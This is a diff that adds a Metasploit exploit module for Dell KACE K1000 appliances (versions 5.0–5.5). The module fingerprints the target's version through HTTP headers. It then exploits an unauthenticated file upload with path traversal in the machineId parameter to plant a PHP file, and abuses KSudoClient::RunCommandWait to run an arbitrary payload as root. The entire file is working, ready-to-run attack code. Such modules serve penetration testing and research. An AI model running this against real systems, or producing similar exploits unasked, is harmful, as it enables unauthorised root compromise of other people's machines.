@@ -1,0 +1,127 @@
+##
+# This module requires Metasploit: http://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'msf/core'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Dell KACE K1000 File Upload',
+      'Description'    => %q{
+          This module exploits a file upload vulnerability in Kace K1000
+        versions 5.0 to 5.3, 5.4 prior to 5.4.76849 and 5.5 prior to 5.5.90547
+        which allows unauthenticated users to execute arbitrary commands
+        under the context of the 'www' user.
+
+        This module also abuses the 'KSudoClient::RunCommandWait' function
+        to gain root privileges.
+
+        This module has been tested successfully with Dell KACE K1000
+        version 5.3.
+      },
+      'License'        => MSF_LICENSE,
+      'Privileged'     => true,
+      'Platform'       => 'unix', # FreeBSD
+      'Arch'           => ARCH_CMD,
+      'Author'         =>
+        [
+          'Bradley Austin (steponequit)', # Initial discovery and exploit
+          'Brendan Coles <bcoles[at]gmail.com>', # Metasploit
+        ],
+      'References'     =>
+        [
+          ['URL', 'http://console-cowboys.blogspot.com/2014/03/the-curious-case-of-ninjamonkeypiratela.html']
+        ],
+      'Payload'        =>
+        {
+          'Space'       => 1024,
+          'BadChars'    => "\x00\x27",
+          'DisableNops' => true,
+          'Compat'      =>
+            {
+              'PayloadType' => 'cmd',
+              'RequiredCmd' => 'generic perl'
+            }
+        },
+      'DefaultTarget'  => 0,
+      'Targets'        =>
+        [
+          ['Automatic Targeting', { 'auto' => true }]
+        ],
+      'DisclosureDate' => 'Mar 7 2014'))
+  end
+
+  def check
+    res = send_request_cgi('uri' => normalize_uri('service', 'kbot_upload.php'))
+    unless res
+      vprint_error('Connection failed')
+      return Exploit::CheckCode::Unknown
+    end
+    if res.code && res.code == 500 && res.headers['X-DellKACE-Appliance'].downcase == 'k1000'
+      if res.headers['X-DellKACE-Version'] =~ /\A([0-9])\.([0-9])\.([0-9]+)\z/
+        vprint_status("Found Dell KACE K1000 version #{res.headers['X-DellKACE-Version']}")
+        if $1.to_i == 5 && $2.to_i <= 3                         # 5.0 to 5.3
+          return Exploit::CheckCode::Vulnerable
+        elsif $1.to_i == 5 && $2.to_i == 4 && $3.to_i <= 76849  # 5.4 prior to 5.4.76849
+          return Exploit::CheckCode::Vulnerable
+        elsif $1.to_i == 5 && $2.to_i == 5 && $3.to_i <= 90547  # 5.5 prior to 5.5.90547
+          return Exploit::CheckCode::Vulnerable
+        end
+        return Exploit::CheckCode::Safe
+      end
+      return Exploit::CheckCode::Detected
+    end
+    Exploit::CheckCode::Safe
+  end
+
+  def exploit
+    # upload payload
+    fname = ".#{rand_text_alphanumeric(rand(8) + 5)}.php"
+    payload_path = "/kbox/kboxwww/tmp/"
+    post_data = "<?php require_once 'KSudoClient.class.php';KSudoClient::RunCommandWait('rm #{payload_path}#{fname};#{payload.encoded}');?>"
+    print_status("Uploading #{fname} (#{post_data.length} bytes)")
+    res = send_request_cgi(
+      'uri' => normalize_uri('service', 'kbot_upload.php'),
+      'method' => 'POST',
+      'vars_get' => Hash[{
+        'filename' => fname,
+        'machineId' => "#{'../' * (rand(5) + 4)}#{payload_path}",
+        'checksum' => 'SCRAMBLE',
+        'mac' => rand_text_alphanumeric(rand(8) + 5),
+        'kbotId' => rand_text_alphanumeric(rand(8) + 5),
+        'version' => rand_text_alphanumeric(rand(8) + 5),
+        'patchsecheduleid' => rand_text_alphanumeric(rand(8) + 5) }.to_a.shuffle],
+      'data' => post_data)
+
+    unless res
+      fail_with(Failure::Unreachable, 'Connection failed')
+    end
+
+    if res.code && res.code == 200
+      print_good('Payload uploaded successfully')
+    else
+      fail_with(Failure::UnexpectedReply, 'Unable to upload payload')
+    end
+
+    # execute payload
+    res = send_request_cgi('uri' => normalize_uri('tmp', fname))
+
+    unless res
+      fail_with(Failure::Unreachable, 'Connection failed')
+    end
+
+    if res.code && res.code == 200
+      print_good('Payload executed successfully')
+    elsif res.code && res.code == 404
+      fail_with(Failure::NotVulnerable, "Could not find payload '#{fname}'")
+    else
+      fail_with(Failure::UnexpectedReply, 'Unable to execute payload')
+    end
+  end
+end
